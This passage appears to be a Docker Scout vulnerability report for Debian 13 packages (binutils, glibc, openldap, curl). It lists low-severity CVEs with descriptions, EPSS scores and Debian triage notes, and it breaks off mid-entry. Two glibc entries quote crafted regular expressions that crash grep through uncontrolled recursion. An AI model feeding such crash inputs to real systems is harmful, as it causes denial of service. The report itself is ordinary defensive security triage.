A vulnerability has been found in GNU Binutils 2.43 and classified as problematic. Affected by this vulnerability is the function __sanitizer::internal_strlen of the file binutils/nm.c of the component nm. The manipulation of the argument const leads to buffer overflow. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32556
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11414?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11414" src="https://img.shields.io/badge/CVE--2025--11414-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in GNU Binutils 2.45. Affected by this vulnerability is the function get_link_hash_entry of the file bfd/elflink.c of the component Linker. This manipulation causes out-of-bounds read. The attack can only be executed locally. The exploit has been publicly disclosed and may be utilized. Upgrading to version 2.46 addresses this issue. Patch name: aeaaa9af6359c8e394ce9cf24911fec4f4d23703. It is advisable to upgrade the affected component.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33450
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=aeaaa9af6359c8e394ce9cf24911fec4f4d23703 (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11413?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11413" src="https://img.shields.io/badge/CVE--2025--11413-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.45. Affected is the function elf_link_add_object_symbols of the file bfd/elflink.c of the component Linker. The manipulation results in out-of-bounds read. The attack needs to be approached locally. The exploit has been made public and could be used. Upgrading to version 2.46 is able to address this issue. The patch is identified as 72efdf166aa0ed72ecc69fc2349af6591a7a19c0. Upgrading the affected component is advised.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33452
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=72efdf166aa0ed72ecc69fc2349af6591a7a19c0 (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11412?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11412" src="https://img.shields.io/badge/CVE--2025--11412-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.45. This impacts the function bfd_elf_gc_record_vtentry of the file bfd/elflink.c of the component Linker. The manipulation leads to out-of-bounds read. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The identifier of the patch is 047435dd988a3975d40c6626a8f739a0b2e154bc. To fix this issue, it is recommended to deploy a patch.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33452
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=047435dd988a3975d40c6626a8f739a0b2e154bc (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11083?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11083" src="https://img.shields.io/badge/CVE--2025--11083-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.45. The affected element is the function elf_swap_shdr in the library bfd/elfcode.h of the component Linker. The manipulation leads to heap-based buffer overflow. The attack must be carried out locally. The exploit has been disclosed to the public and may be used. The identifier of the patch is 9ca499644a21ceb3f946d1c179c38a83be084490. To fix this issue, it is recommended to deploy a patch. The code maintainer replied with "[f]ixed for 2.46".

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33457
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=9ca499644a21ceb3f946d1c179c38a83be084490 (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11082?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11082" src="https://img.shields.io/badge/CVE--2025--11082-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw has been found in GNU Binutils 2.45. Impacted is the function _bfd_elf_parse_eh_frame of the file bfd/elf-eh-frame.c of the component Linker. Executing manipulation can lead to heap-based buffer overflow. The attack is restricted to local execution. The exploit has been published and may be used. This patch is called ea1a0737c7692737a644af0486b71e4a392cbca8. A patch should be applied to remediate this issue. The code maintainer replied with "[f]ixed for 2.46".

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33464
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=ea1a0737c7692737a644af0486b71e4a392cbca8 (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11081?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11081" src="https://img.shields.io/badge/CVE--2025--11081-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was detected in GNU Binutils 2.45. This issue affects the function dump_dwarf_section of the file binutils/objdump.c. Performing manipulation results in out-of-bounds read. The attack is only possible with local access. The exploit is now public and may be used. The patch is named f87a66db645caf8cc0e6fc87b0c28c78a38af59b. It is suggested to install a patch to address this issue.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33406
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=f87a66db645caf8cc0e6fc87b0c28c78a38af59b (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-32256?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2021--32256" src="https://img.shields.io/badge/CVE--2021--32256-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.124%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in GNU libiberty, as distributed in GNU Binutils 2.36. It is a stack-overflow issue in demangle_type in rust-demangle.c.

---
- binutils <unfixed> (unimportant)
https://bugs.launchpad.net/ubuntu/+source/binutils/+bug/1927070
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-9996?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--9996" src="https://img.shields.io/badge/CVE--2018--9996-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.385%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.30. Stack Exhaustion occurs in the C++ demangling functions provided by libiberty, and there are recursive stack frames: demangle_template_value_parm, demangle_integral_value, and demangle_expression.

---
- binutils <unfixed> (unimportant)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=85304
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20712?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--20712" src="https://img.shields.io/badge/CVE--2018--20712-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.673%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>72nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer over-read exists in the function d_expression_1 in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31.1. A crafted input can cause segmentation faults, leading to denial-of-service, as demonstrated by c++filt.

---
- binutils <unfixed> (unimportant)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=88629
https://sourceware.org/bugzilla/show_bug.cgi?id=24043
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20673?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--20673" src="https://img.shields.io/badge/CVE--2018--20673-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.093%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The demangle_template function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31.1, contains an integer overflow vulnerability (for "Create an array for saving the template argument values") that can trigger a heap-based buffer overflow, as demonstrated by nm.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24039
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-13716?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--13716" src="https://img.shields.io/badge/CVE--2017--13716-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.237%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The C++ symbol demangler routine in cplus-dem.c in libiberty, as distributed in GNU Binutils 2.29, allows remote attackers to cause a denial of service (excessive memory allocation and application crash) via a crafted file, as demonstrated by a call from the Binary File Descriptor (BFD) library (aka libbfd).

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=22009
Underlying bug is though in the C++ demangler part of libiberty, but MITRE
has assigned it specifically to the issue as raised within binutils.
binutils not covered by security support

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>glibc</strong> <code>2.41-12+deb13u3</code> (deb)</summary>

<small><code>pkg:deb/debian/glibc@2.41-12%2Bdeb13u3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-9192?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--9192" src="https://img.shields.io/badge/CVE--2019--9192-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.790%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\1\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24269

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010025?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010025" src="https://img.shields.io/badge/CVE--2019--1010025-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.840%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is "ASLR bypass itself is not a vulnerability.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22853

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010024?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010024" src="https://img.shields.io/badge/CVE--2019--1010024-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.634%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22852

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010023?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010023" src="https://img.shields.io/badge/CVE--2019--1010023-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.307%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010022?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2019--1010022" src="https://img.shields.io/badge/CVE--2019--1010022-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.129%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22850

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20796?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--20796" src="https://img.shields.io/badge/CVE--2018--20796-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.492%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141
https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html
No treated as vulnerability: https://sourceware.org/glibc/wiki/Security%20Exceptions

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4756?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2010--4756" src="https://img.shields.io/badge/CVE--2010--4756-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.394%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.

---
- glibc <removed> (unimportant)
- eglibc <unfixed> (unimportant)
That's standard POSIX behaviour implemented by (e)glibc. Applications using
glob need to impose limits for themselves

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 5" src="https://img.shields.io/badge/L-5-fce1a9"/> <!-- unspecified: 0 --><strong>openldap</strong> <code>2.6.10+dfsg-1</code> (deb)</summary>

<small><code>pkg:deb/debian/openldap@2.6.10%2Bdfsg-1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22185?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--22185" src="https://img.shields.io/badge/CVE--2026--22185-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenLDAP Lightning Memory-Mapped Database (LMDB) versions up to and including 0.9.14, prior to commit 8e1fda8, contain a heap buffer underflow in the readline() function of mdb_load. When processing malformed input containing an embedded NUL byte, an unsigned offset calculation can underflow and cause an out-of-bounds read of one byte before the allocated heap buffer. This can cause mdb_load to crash, leading to a limited denial-of-service condition.

---
- openldap <unfixed> (unimportant)
- lmdb <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126287)
[trixie] - lmdb <no-dsa> (Minor issue)
[bookworm] - lmdb <no-dsa> (Minor issue)
[bullseye] - lmdb <postponed> (Minor issue, OOB read)
https://seclists.org/fulldisclosure/2026/Jan/5
https://bugs.openldap.org/show_bug.cgi?id=10421
Fixed by: https://git.openldap.org/openldap/openldap/-/commit/8e1fda85532a3c74276df38a42d234dcdfa1e40d
OpenLDAP bundles lmdb but does not build mdb_load.c

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-15719?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2020--15719" src="https://img.shields.io/badge/CVE--2020--15719-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.216%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libldap in certain third-party OpenLDAP packages has a certificate-validation flaw when the third-party package is asserting RFC6125 support. It considers CN even when there is a non-matching subjectAltName (SAN). This is fixed in, for example, openldap-2.4.46-10.el8 in Red Hat Enterprise Linux.

---
- openldap <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=965184)
https://bugs.openldap.org/show_bug.cgi?id=9266
https://bugzilla.redhat.com/show_bug.cgi?id=1740070
RedHat/CentOS applied patch: https://git.centos.org/rpms/openldap/raw/67459960064be9d226d57c5f82aaba0929876813/f/SOURCES/openldap-tlso-dont-check-cn-when-bad-san.patch
OpenLDAP upstream did dispute the issue as beeing valid, as the current libldap
behaviour does conform with RFC4513. RFC6125 does not superseed the rules for
verifying service identity provided in specifications for existing application
protocols published prior to RFC6125, like RFC4513 for LDAP.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-17740?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--17740" src="https://img.shields.io/badge/CVE--2017--17740-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>6.138%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

contrib/slapd-modules/nops/nops.c in OpenLDAP through 2.4.45, when both the nops module and the memberof overlay are enabled, attempts to free a buffer that was allocated on the stack, which allows remote attackers to cause a denial of service (slapd crash) via a member MODDN operation.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi/Incoming?id=8759
nops slapd-module not built

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-14159?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--14159" src="https://img.shields.io/badge/CVE--2017--14159-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.111%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

slapd in OpenLDAP 2.4.45 and earlier creates a PID file after dropping privileges to a non-root account, which might allow local users to kill arbitrary processes by leveraging access to this non-root account for PID file modification before a root script executes a "kill `cat /pathname`" command, as demonstrated by openldap-initscript.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi?findid=8703
Negligible security impact, but filed #877512

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2015-3276?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2015--3276" src="https://img.shields.io/badge/CVE--2015--3276-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.575%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The nss_parse_ciphers function in libraries/libldap/tls_m.c in OpenLDAP does not properly parse OpenSSL-style multi-keyword mode cipher strings, which might cause a weaker than intended cipher to be used and allow remote attackers to have unspecified impact via unknown vectors.

---
- openldap <unfixed> (unimportant)
Debian builds with GNUTLS, not NSS

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>curl</strong> <code>8.14.1-2+deb13u3</code> (deb)</summary>

<small><code>pkg:deb/debian/curl@8.14.1-2%2Bdeb13u3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-15224?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--15224" src="https://img.shields.io/badge/CVE--2025--15224-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.098%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and asked to do public key authentication, curl would wrongly still ask and authenticate using a locally running SSH agent.

---
- curl 8.18.0-1 (unimportant)
https://curl.se/docs/CVE-2025-15224.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/16d5f2a5660c61cc27bd5f1c7f512391d1c927aa (curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15079?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--15079" src="https://img.shields.io/badge/CVE--2025--15079-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and setting the known_hosts file, libcurl could still mistakenly accept connecting to hosts *not present* in the specified file if they were added as recognized in the libssh *global* known_hosts file.

---
- curl 8.18.0~rc3-1 (unimportant)
https://curl.se/docs/CVE-2025-15079.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/adca486c125d9a6d9565b9607a19dce803a8b479 (rc-8_18_0-3, curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14017?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--14017" src="https://img.shields.io/badge/CVE--2025--14017-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

